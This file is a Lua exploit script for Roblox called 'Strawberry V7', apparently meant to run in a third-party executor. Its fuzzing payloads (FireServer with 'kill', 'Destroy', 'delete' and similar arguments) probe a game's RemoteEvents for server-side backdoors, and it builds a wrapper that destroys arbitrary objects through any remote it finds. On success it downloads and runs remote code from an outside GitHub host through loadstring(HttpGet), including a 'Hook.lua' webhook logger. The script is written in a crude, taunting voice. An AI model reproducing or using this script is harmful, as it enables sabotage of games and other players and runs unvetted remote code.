--[[
    Strawberry V7
    Scanner and Exploitation Core rewritten by sane.
    Don't bother trying to understand this if you're a skid. You'll just hurt yourself.
]]

-- //===================[ CONFIG ]===================//

local Config = {
	ScanSafeTime = 0.1, -- Faster, more aggressive. Your shit executor might not keep up.
	ShowScannerProgress = true,
	EnableGUIAfterScan = true,
	ExecutorName = getexecutorname and getexecutorname() or "Unknown"
}

-- //===================[ CORE ]===================//

local Services = {
	Players = game:GetService("Players"),
	ReplicatedStorage = game:GetService("ReplicatedStorage"),
	HttpService = game:GetService("HttpService"),
	StarterGui = game:GetService("StarterGui"),
	CoreGui = game:GetService("CoreGui"),
	Workspace = game:GetService("Workspace"),
	Debris = game:GetService("Debris"),
	RunService = game:GetService("RunService")
}

local LocalPlayer = Services.Players.LocalPlayer
local Hint = Instance.new("Hint", Services.Workspace)
Hint.Text = "STRAWBERRY V7: INJECTED. COMMENCING HEURISTIC VULNERABILITY SCAN."

local Vulnerability = {
	Found = false,
	Remote = nil,
	Wrapper = nil,
	HighestScore = 0
}

local function Notify(message, duration)
	pcall(function()
		Services.StarterGui:SetCore("SendNotification", {
			Title = "Strawberry V7",
			Text = tostring(message),
			Duration = duration or 5
		})
	end)
end

if LocalPlayer:FindFirstChild("deletebind") then
	LocalPlayer.deletebind:Destroy()
end
local deleteBind = Instance.new("BindableEvent", LocalPlayer)
deleteBind.Name = "deletebind"
deleteBind.Event:Connect(function(instance)
	if Vulnerability.Found and Vulnerability.Wrapper then
		Vulnerability.Wrapper(instance)
	else
		Notify("Backdoor not loaded or wrapper is nil.", 3)
	end
end)

-- //===================[ WEBHOOK LOGGER ]===================//

local function SendWebhook()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))();
end

-- //===================[ ADVANCED SCANNER ]===================//

local function CreateTestDummy()
	local dummy = Instance.new("Model", Services.Workspace)
	dummy.Name = "StrawberryTestDummy_"..math.random(1000, 9999)
	local hrp = Instance.new("Part", dummy)
	hrp.Name = "HumanoidRootPart"
	hrp.Size = Vector3.new(2, 2, 1)
	hrp.Anchored = true
	hrp.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(5, 5, 5)
	local head = Instance.new("Part", dummy)
	head.Name = "Head"
	head.Size = Vector3.new(2, 1, 1)
	head.Anchored = true
	head.CFrame = hrp.CFrame * CFrame.new(0, 2, 0)
	local humanoid = Instance.new("Humanoid", dummy)
	humanoid.Name = "Humanoid"
	humanoid.Health = 100
	humanoid.MaxHealth = 100
	Services.Debris:AddItem(dummy, 15)
	return dummy
end

local FuzzingPayloads = {
	-- Pattern, Score, ValidationCheck
	{function(remote, target) remote:FireServer(target) end, 10, "IsDestroyed"},
	{function(remote, target) remote:FireServer(nil, target) end, 10, "IsDestroyed"},
	{function(remote, target) remote:FireServer(nil, nil, target) end, 10, "IsDestroyed"},
	{function(remote, target) remote:FireServer({target}) end, 10, "IsDestroyed"},
	{function(remote, target) remote:FireServer({Target = target}) end, 10, "IsDestroyed"},
	{function(remote, target) remote:FireServer("Destroy", target) end, 20, "IsDestroyed"},
	{function(remote, target) remote:FireServer("delete", target) end, 20, "IsDestroyed"},
	{function(remote, target) remote:FireServer("remove", target) end, 20, "IsDestroyed"},
	{function(remote, target) remote:FireServer({action = "delete", object = target}) end, 20, "IsDestroyed"},
	{function(remote, target) remote:FireServer(target.Name) end, 15, "IsDestroyed"},
	{function(remote, target) remote:FireServer("kill", target) end, 100, "IsDead"},
	{function(remote, target) remote:FireServer("Kill", target) end, 100, "IsDead"},
	{function(remote, target) remote:FireServer(target) end, 90, "IsDead"},
}

local function IsVulnerable(remote)
	local testDummy = CreateTestDummy()
	task.wait() -- ensure dummy exists

	for _, payloadInfo in ipairs(FuzzingPayloads) do
		local patternFunc, score, validationType = table.unpack(payloadInfo)
		
		if not testDummy or not testDummy.Parent then
			testDummy = CreateTestDummy() -- recreate if it got fucked
			task.wait()
		end
		
		local human = testDummy:FindFirstChildOfClass("Humanoid")
		local hrp = testDummy:FindFirstChild("HumanoidRootPart")
		if not human or not hrp then continue end

		local destroyed = false
		local killed = false

		local ancestryConn = hrp.AncestryChanged:Connect(function(_, parent)
			if parent == nil then destroyed = true end
		end)

		local success, err = pcall(patternFunc, remote, testDummy)
		task.wait(Config.ScanSafeTime)

		if validationType == "IsDestroyed" and destroyed then
			Notify("PASSED: IsDestroyed with score "..score)
			ancestryConn:Disconnect()
			if score > Vulnerability.HighestScore then
				Vulnerability.HighestScore = score
				Vulnerability.Remote = remote
				Vulnerability.Wrapper = function(instance) pcall(patternFunc, remote, instance) end
			end
		elseif validationType == "IsDead" and human.Health <= 0 then
			Notify("PASSED: IsDead with score "..score)
			ancestryConn:Disconnect()
			if score > Vulnerability.HighestScore then
				Vulnerability.HighestScore = score
				Vulnerability.Remote = remote
				Vulnerability.Wrapper = function(instance) pcall(patternFunc, remote, instance) end
			end
		end

		ancestryConn:Disconnect()
	end
	pcall(function() testDummy:Destroy() end)
end

local function ScanForBackdoor()
	local locationsToScan = {
		Services.ReplicatedStorage,
		Services.Workspace,
		Services.StarterGui,
		game:GetService("Lighting"),
		LocalPlayer.PlayerGui
	}

	for _, root in ipairs(locationsToScan) do
		if Config.ShowScannerProgress then Hint.Text = "STRAWBERRY V7: Fuzzing remotes in " .. root:GetFullName() end

		for _, remote in ipairs(root:GetDescendants()) do
			if remote:IsA("RemoteEvent") then
				if not remote.Parent or remote.Parent.Name == "RobloxReplicatedStorage" then continue end
				IsVulnerable(remote)
			end
		end
	end
	
	if Vulnerability.Remote then Vulnerability.Found = true end
end

-- //===================[ SCRIPT EXECUTION ]===================//

task.wait(1)
local scanStartTime = tick()
ScanForBackdoor()

if Vulnerability.Found then
	local scanTime = string.format("%.2f", tick() - scanStartTime)
	Hint.Text = "STRAWBERRY V7: VULNERABILITY FOUND IN "..scanTime.."s. REMOTE: " .. Vulnerability.Remote.Name .. ". SCORE: "..Vulnerability.HighestScore
	Notify("Backdoor found: " .. Vulnerability.Remote:GetFullName(), 10)
	SendWebhook()

	if Config.EnableGUIAfterScan then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/UI_Source/v6.lua"))()
	end

	task.wait(10)
	Hint:Destroy()
else
	Hint.Text = "STRAWBERRY V7: SCAN COMPLETE. NO VULNERABILITIES FOUND. THIS GAME ISN'T MADE BY A MORON."
	Notify("Scan complete. No vulnerable remotes found. Lame.", 10)
	task.wait(10)
	Hint:Destroy()
end
